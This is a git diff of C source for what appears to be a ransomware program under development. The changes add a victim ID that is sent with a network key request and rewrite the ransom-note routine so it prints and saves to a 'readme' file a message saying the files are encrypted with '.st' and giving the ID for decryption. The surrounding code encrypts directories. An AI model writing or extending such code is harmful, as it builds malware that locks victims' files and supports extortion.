@@ -9,6 +9,8 @@
 #endif
 #include "libcom.h"
 
+int ID = 0;
+
 FILE* openFile(const char* path, const char* mode){
   FILE* fp = fopen(path,mode);
     // if error when opening one of the two file then exit
@@ -62,9 +64,12 @@ int docrypt(FILE* in, FILE* out, const char* key, char (*cyph)(char, const char*
   return 0;
 }
 
-char* getKey(){
+char* getKey(int tmp_ID){
+  if(tmp_ID != 0){
+    ID = tmp_ID;
+  }
   // online stuff
-  char* key = net_get() ?
+  char* key = net_get(&ID) ?
     //if network on
     :
     // if network off
@@ -156,11 +161,19 @@ int encDir(char* path, const char* key){
 }
 
 void leaveExplanation(){
-  printf(
-      "Hello,\n"
+  int len = 275;
+  char* explanation = calloc(1,len);
+      snprintf(explanation, len, "Hello,\n"
       "Your files are now encrypted with the extension .st\n"
       "If you wanna recover your file just re run the program\n"
       "This is only temporary until we finish the project\n"
       "Have a good day^^\n"
-      );
+      "Your ID to decrypt the data is : %d\n", ID);
+    printf("%s", explanation);
+    FILE* readme = fopen("readme", "w+");
+    if(readme == NULL){
+      return;
+    }
+    fprintf(readme, "%s", explanation);
+    fclose(readme);
 }
